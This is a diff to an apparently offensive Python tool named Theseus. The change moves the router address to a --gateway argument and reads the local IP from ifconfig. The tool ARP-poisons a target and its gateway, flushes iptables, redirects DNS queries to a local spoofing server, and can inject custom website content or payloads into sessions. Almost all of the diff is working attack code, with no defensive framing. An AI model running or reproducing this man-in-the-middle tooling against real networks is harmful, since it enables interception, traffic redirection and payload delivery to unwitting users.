@@ -4,7 +4,6 @@ import sys
 import socket
 import argparse
 import threading
-import configparser
 import multiprocessing
 from arp.arp import Arp_Spoof
 from logger.logger import Logger
@@ -23,6 +22,8 @@ class Theseus(object):
 		ap = argparse.ArgumentParser(description="Theseus", add_help=True)
 		ap.add_argument("--target", help="This is the targets ip address", required=True)
 		ap.add_argument("--iface", help="This is the network cards current interface", required=True)
+		ap.add_argument("--gateway", help="This is the routers ip address", required=True)
+		ap.add_argument("--verbose", help="This is the time interval between the arp packets", required=False)
 		ap.add_argument("--target-mac", help="This is the targets mac address", required=False)
 		ap.add_argument('--arp-ping', action='store_const', const=sum, help='This will get the targets mac address via a discret arp ping')
 		ap.add_argument('--force-content', action='store_const', const=sum, help='This option will force a custom website into each session')
@@ -30,9 +31,6 @@ class Theseus(object):
 		args = ap.parse_args()
 
 		log.status("Configuring iptables")
-		cfg = configparser.RawConfigParser()
-		cfile = 'theseus.cfg'
-		cfg.read(cfile)
 		#Configure kernal and iptables for the attack
 		os.popen("{ echo 0 > /proc/sys/net/ipv4/ip_forward;\
 					iptables --flush;\
@@ -41,9 +39,7 @@ class Theseus(object):
 					iptables -t nat -A PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 5000; }") #Changed IP Forwarding
 
 		# Load Setting From Config file
-		log.status("Reading configuration file")
-		router = cfg.get('Arp-Spoof-Settings', 'routers_ip_address')
-		local = cfg.get('Theseus-Settings', 'local_ip_address')
+		local = os.popen('ifconfig | grep -Eo \'inet (addr:)?([0-9]*\.){3}[0-9]*\' | grep -Eo \'([0-9]*\.){3}[0-9]*\' | grep -v \'127.0.0.1\'').read().strip('\n')
 		payloads_folder = 'server/Payloads'
 		verbose = 5
 
@@ -55,7 +51,7 @@ class Theseus(object):
 			exit()
 		try:
 			socket.inet_aton(args.target)
-			socket.inet_aton(router)
+			socket.inet_aton(args.gateway)
 		except socket.error:
 			print("\033[1;31mIncorrect IP address\033[00m")
 			exit()
@@ -79,7 +75,6 @@ class Theseus(object):
 			dns.send_reply(addr, raw, redirect_ip)
 
 	def attack_dns_spoof(self):
-		local = cfg.get('Theseus-Settings', 'local_ip_address')
 		dns = DNS_Server(local)
 		jobs = []
 		for i in range(4):
@@ -96,7 +91,7 @@ class Theseus(object):
 				log.warn("{} is at {}".format(args.target, tm))
 
 			ajobs = []
-			victim_thread = multiprocessing.Process(target=arp.poison_victim, args=(args.target, router, int(verbose), args.iface, tm))
+			victim_thread = multiprocessing.Process(target=arp.poison_victim, args=(args.target, args.gateway, int(verbose), args.iface, tm))
 			ajobs.append(victim_thread)
 			victim_thread.start()
 			try:
@@ -106,11 +101,11 @@ class Theseus(object):
 			except socket.herror:
 				log.warn("Started attack on {}".format(args.target))
 
-			target_thread = multiprocessing.Process(target=arp.poison_router, args=(router, args.target, int(verbose), args.iface, tm))
+			target_thread = multiprocessing.Process(target=arp.poison_router, args=(args.gateway, args.target, int(verbose), args.iface, tm))
 			ajobs.append(victim_thread)
 			target_thread.start()
 			try:
-				rname = socket.gethostbyaddr(router)[0]
+				rname = socket.gethostbyaddr(args.gateway)[0]
 				rname = rname.replace('.home', " ")
 				log.status("Started attack on {}".format(rname))
 			except socket.herror:
@@ -150,11 +145,7 @@ if __name__ == '__main__':
 		tm = t.arp_ping()
 
 	if 'arp' in args.spoof:
-		try:
-			t.arp_spoof(tm)
-		except NameError:
-			log.critical("Theseus must have a mac address for the target... (--target-mac, --arp-ping)")
-			exit()
+		t.arp_spoof(tm)
 
 	if args.force_content:
 		t.force_content()
